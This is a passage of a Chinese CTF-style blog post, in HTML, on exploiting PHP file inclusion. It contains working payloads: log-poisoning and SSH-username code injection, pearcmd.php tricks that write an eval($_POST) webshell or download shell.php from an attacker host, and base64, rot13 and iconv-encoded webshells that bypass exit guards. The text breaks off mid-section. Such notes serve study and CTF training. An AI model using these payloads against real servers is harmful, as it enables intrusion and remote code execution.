@@ -1,0 +1,945 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="一个php文件包含另一个php文件，可以提升代码的复用性。 若包含不当会导致安全漏洞。 php常见的文件包含函数 1234include &amp;#x27;a.php&amp;#x27;include_once &amp;#x27;a.php&amp;#x27; #只包含一次require &amp;#x27;a.php&amp;#x27;require_once &amp;#x27;a.php&amp;#x27; #只包含一次 require 包含文件遇到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php文件包含">
+<meta property="og:url" content="https://fru1ts.github.io/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="一个php文件包含另一个php文件，可以提升代码的复用性。 若包含不当会导致安全漏洞。 php常见的文件包含函数 1234include &amp;#x27;a.php&amp;#x27;include_once &amp;#x27;a.php&amp;#x27; #只包含一次require &amp;#x27;a.php&amp;#x27;require_once &amp;#x27;a.php&amp;#x27; #只包含一次 require 包含文件遇到">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fru1ts.github.io/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg">
+<meta property="article:published_time" content="2023-07-07T22:01:44.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:54:39.565Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fru1ts.github.io/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg">
+  
+  
+  
+  <title>php文件包含 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-07 22:01" pubdate>
+          July 7, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          87 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">php文件包含</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>一个php文件包含另一个php文件，可以提升代码的复用性。</p>
+<p>若包含不当会导致安全漏洞。</p>
+<p>php常见的文件包含函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;a.php&#x27;</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;a.php&#x27;</span> <span class="hljs-comment">#只包含一次</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;a.php&#x27;</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;a.php&#x27;</span> <span class="hljs-comment">#只包含一次</span><br></code></pre></td></tr></table></figure>
+<p><code>require</code> 包含文件遇到错误时，程序就不会继续往下执行了。</p>
+<p><code>include</code>包含文件遇到错误时，程序还可以继续往下执行。读到不存在的目录仍然能路径穿越，<code>1?/../../flag</code></p>
+<p>文件包含会先将文件的内容读出来，如果包含的文件内容是php代码则会解析成php，如果不是则原样输出，和文件的后缀名无关。</p>
+<h2 id="php本地文件包含"><a class="markdownIt-Anchor" href="#php本地文件包含"></a> php本地文件包含</h2>
+<p>直接指定服务器的文件进行包含</p>
+<h3 id="无限制"><a class="markdownIt-Anchor" href="#无限制"></a> 无限制</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>可以通过绝对路径或者伪协议进行文件包含</p>
+<h3 id="前面限制"><a class="markdownIt-Anchor" href="#前面限制"></a> 前面限制</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&gt;?<br></code></pre></td></tr></table></figure>
+<p>只能利用路径穿越进行文件包含</p>
+<p>利用<code>/etc/passwd</code>进行测试，有回显说明是无限制，无回显说明有限制，可以用<code>../../etc/passwd</code>进行路径穿越，确定根目录</p>
+<p>有一道远程文件包含限制前缀为<code>https://www\.php\.net</code>,（HCERT CTF）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^https://www\.php\.net/@&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">tmpfile</span>();<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$tmp</span>, <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]));<br>    @<span class="hljs-keyword">include_once</span>(<span class="hljs-title function_ invoke__">stream_get_meta_data</span>(<span class="hljs-variable">$tmp</span>)[<span class="hljs-string">&#x27;uri&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$tmp</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>利用payload:<code>?f=flag.php&amp;url=https://www.php.net/cached.php?f=cached.php</code>(包含cached.php这个文件后进行文件读取)</p>
+<h3 id="后面限制"><a class="markdownIt-Anchor" href="#后面限制"></a> 后面限制</h3>
+<p>限制后缀名</p>
+<p>可以使用伪协议中的<code>php://filter、phar://、zip://</code>来进行rce</p>
+<h3 id="php-get-shell方式"><a class="markdownIt-Anchor" href="#php-get-shell方式"></a> php get-shell方式</h3>
+<p>思路：将php代码植入主机中，再使php代码得到解析</p>
+<h4 id="1利用文件上传"><a class="markdownIt-Anchor" href="#1利用文件上传"></a> 1.利用文件上传</h4>
+<p>上传php代码,例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="2利用中间件日志文件"><a class="markdownIt-Anchor" href="#2利用中间件日志文件"></a> 2.利用中间件日志文件</h4>
+<p>例如当请求</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://127.0.0.1:8080/1.php?file=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>这个请求会保存在日志中，通过文件包含日志文件，则可解析植入的php代码</p>
+<h4 id="3ssh日志文件包含"><a class="markdownIt-Anchor" href="#3ssh日志文件包含"></a> 3.ssh日志文件包含</h4>
+<p>利用ssh协议去连接主机，例如</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@host</span><br></code></pre></td></tr></table></figure>
+<p>代码将被当成用户名保存在<code>/var/log/auth.log</code>中，利用文件包含即可</p>
+<h3 id="pearcmdphp"><a class="markdownIt-Anchor" href="#pearcmdphp"></a> pearcmd.php</h3>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+<p>利用条件：存在<code>pearcmd.php</code>,可以利用文件包含测试。</p>
+<p>1.写文件getshell poc</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;<span class="hljs-regexp">/&lt;?=phpinfo()?&gt;+/</span>tmp/hello.php<br></code></pre></td></tr></table></figure>
+<p>再访问<code>/tmp/hello.php</code></p>
+<p>2.下载文件 poc</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp;&amp;+download+http:<span class="hljs-comment">//ip:port/shell.php</span></span><br></code></pre></td></tr></table></figure>
+<p>将木马写好放在vps上，再利用pearcmd.php将文件下载到靶机getshell。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
+<p>文件包含被限制后缀时可以尝试pearcmd</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">include</span>($<span class="hljs-keyword">file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>条件：</p>
+<ul>
+<li>安装了pear</li>
+<li>开启了register_argc_argv</li>
+</ul>
+<p>用bp发包，get 需要用短标签</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">file</span>=pearcmd&amp;+config-create+<span class="hljs-regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>var<span class="hljs-regexp">/www/</span>html/evil.php<br></code></pre></td></tr></table></figure>
+<p>访问/evil.php</p>
+<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">register_argc_argv与include to RCE的巧妙组合</a></p>
+<h2 id="php远程文件包含"><a class="markdownIt-Anchor" href="#php远程文件包含"></a> php远程文件包含</h2>
+<p>需要php.ini中配置<code>allow_url_include=On</code></p>
+<h3 id="利用协议远程包含文件"><a class="markdownIt-Anchor" href="#利用协议远程包含文件"></a> 利用协议远程包含文件</h3>
+<img src="/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>被包含的文件需要放在有公网ip的主机上</p>
+<p>可用的协议有<code>HTTP、FTP、SMB、Webdav</code>等</p>
+<h2 id="漏洞攻击伪协议利用方法"><a class="markdownIt-Anchor" href="#漏洞攻击伪协议利用方法"></a> 漏洞攻击伪协议利用方法</h2>
+<p>可以利用伪协议的函数:<code>include(),file_get_contens(),highlight_file(),file_exists()</code></p>
+<h3 id="file"><a class="markdownIt-Anchor" href="#file"></a> file://</h3>
+<p>file://用于访问本地文件系统,在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]))	<br>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><code>file:// [文件的绝对路径和文件名]</code></p>
+<p>example:<a target="_blank" rel="noopener" href="http://localhost:37917/?page=file:///var/www/html/phpinfo.php">http://localhost:37917/?page=file:///var/www/html/phpinfo.php</a></p>
+<h3 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h3>
+<p>需要<code>allow_url_include=On</code></p>
+<p>对于HTTP请求中<code>Content-Type:multipart/form-data</code>是无效的</p>
+<p><code>php://input</code>是PHP的输入流，获取POST的所有数据(把要传的数据写在post中)</p>
+<h3 id="data"><a class="markdownIt-Anchor" href="#data"></a> data://</h3>
+<p>需<code>allow_url_include=On	</code></p>
+<p>传入数据的协议</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">data:<span class="hljs-regexp">//</span>text/plain,要传入的数据<br>data:<span class="hljs-regexp">//</span>text/plain;base64,要传入的数据ba64编码<br></code></pre></td></tr></table></figure>
+<h3 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter"></a> <strong>php://filter</strong></h3>
+<p>需要开启<code>allow_url_fopen</code></p>
+<p>对读到的文件内容进行处理</p>
+<p>常见的过滤器</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php <span class="hljs-comment">#base64编码</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=string.rot13/</span>resource=index.php	<span class="hljs-comment">#rot13编码</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=index.php	<span class="hljs-comment">#从字符串中去除HTML和PHP标记</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.toupper/</span>resource=index.php	<span class="hljs-comment">#全部转大写</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=string.tolower/</span>resource=index.php	<span class="hljs-comment">#全部转小写</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.quoted-printable-encode/</span>resource=index.php	<span class="hljs-comment">#将字符串转化为8bit字符串</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7/</span>resource=index.php	<span class="hljs-comment">#对字符从utf-8到utf-7转换</span><br></code></pre></td></tr></table></figure>
+<p>除了用php:filter来读取文件还可以用来写入文件</p>
+<p>以明文方式写入</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter/resource=test.txt&amp;txt=helloworld<br></code></pre></td></tr></table></figure>
+<p>编码写入</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-encode/</span>resource=test.txt&amp;txt=helloworld<br></code></pre></td></tr></table></figure>
+<h4 id="base64解码特点"><a class="markdownIt-Anchor" href="#base64解码特点"></a> base64解码特点</h4>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>可以使用 php://filter/write=convert.base64-decode 来先解码去除base64中没有的字符，在编码得到新的字符。</p>
+<h4 id="死亡exit绕过"><a class="markdownIt-Anchor" href="#死亡exit绕过"></a> 死亡exit绕过</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure>
+<p>写入的语句在执行前先执行了exit退出了。</p>
+<h5 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64</h5>
+<p>通过php://filter的base64-decode来绕过</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">filename=php://filter/write=convert.base64-decode/resource=shell.php</span><br><span class="language-xml">txt=aPD9waHAgZXZhbCgkX1BPU1RbMTFdKTs/Pg==  //</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">11</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>前面加一个<code>a</code>的原因：<code>phpexit</code>共7个字符，base64算法解码时是4个byte一组，所以给他增加1个<code>a</code>一共8个字符。<code>phpexita</code>被正常解码,后面传入的websehll也能够正常解码。</p>
+<h5 id="rot13"><a class="markdownIt-Anchor" href="#rot13"></a> rot13</h5>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">filename=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.<span class="hljs-keyword">string</span>.rot13/resource=<span class="hljs-built_in">shell</span>.php<br>txt=<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h5 id="相邻两位反转"><a class="markdownIt-Anchor" href="#相邻两位反转"></a> 相邻两位反转</h5>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">122.114</span>.<span class="hljs-number">254.128</span>:<span class="hljs-number">28049</span><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>convert.iconv.UCS-<span class="hljs-number">2</span>LE.UCS-<span class="hljs-number">2</span>BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&amp;contents=?&lt;hp pe@av(l_<span class="hljs-variable">$OPTS1</span>[<span class="hljs-number">32</span>]<span class="hljs-number">4</span>;)&gt;?<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1234]);?&gt;&#x27;</span>);<br><span class="hljs-comment">//?&lt;hp pe@av(l_$OPTS1[32]4;)&gt;?</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xiaolong22333.top/archives/114/">https://xiaolong22333.top/archives/114/</a></p>
+<h4 id="filterchain绕过"><a class="markdownIt-Anchor" href="#filterchain绕过"></a> filterchain绕过</h4>
+<p>（本地文件包含）无需可控文件</p>
+<blockquote>
+<p>原理</p>
+<ul>
+<li>
+<p>利用本地已有的固定文件内容</p>
+</li>
+<li>
+<p>convert.iconv 将数据从字符集 A 转换为字符集 B</p>
+</li>
+<li>
+<p>基于PHP Base64 Filter 宽松的解析，通过编码再解码去除多余的不可见字符构造webshell</p>
+</li>
+</ul>
+</blockquote>
+<p>字符转换例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">#输入的是,some&lt;&gt;text</span><br><span class="hljs-comment">#转换后变成some+ADwAPg-text</span><br></code></pre></td></tr></table></figure>
+<p>利用base64去除不可见字符例子</p>
